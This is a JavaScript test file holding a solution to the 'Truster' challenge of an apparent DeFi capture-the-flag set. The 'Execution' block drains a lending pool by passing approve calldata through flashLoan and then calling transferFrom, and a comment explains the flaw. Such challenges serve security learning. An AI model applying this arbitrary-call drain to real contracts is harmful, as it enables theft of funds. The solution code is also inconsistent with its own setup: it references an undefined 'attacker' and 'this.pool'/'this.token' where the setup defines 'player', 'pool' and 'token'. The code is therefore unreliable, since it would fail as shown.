const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        /** Exploit analysis
         * I need to take advantage of the contract allowing me to use it as caller.
         * I can call for an unlimited approve to the attacker's address.
         * And I can set the borrower to the contract itself, so the requires will pass,
         * letting the attacker to withdraw the funds later. Alternatively I can
         * borrow 0.
         */
        let calldata, allowanceAfter, allowanceBefore, currentAllowance;
        this.pool = await this.pool.connect(attacker);
        this.token = await this.token.connect(attacker);

        calldata = this.token.interface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL]);
        
        allowanceBefore = await this.token.allowance(this.pool.address, attacker.address);
        allowanceBefore = ethers.utils.formatEther(allowanceBefore);

        await this.pool.flashLoan(0, this.pool.address, this.token.address, calldata);
        
        currentAllowance = allowanceAfter = await this.token.allowance(this.pool.address, attacker.address)
        allowanceAfter = ethers.utils.formatEther(allowanceAfter);
        
        // console.log(`Allowance before: ${allowanceBefore}. Allowance after: ${allowanceAfter}.`);

        await this.token.transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});

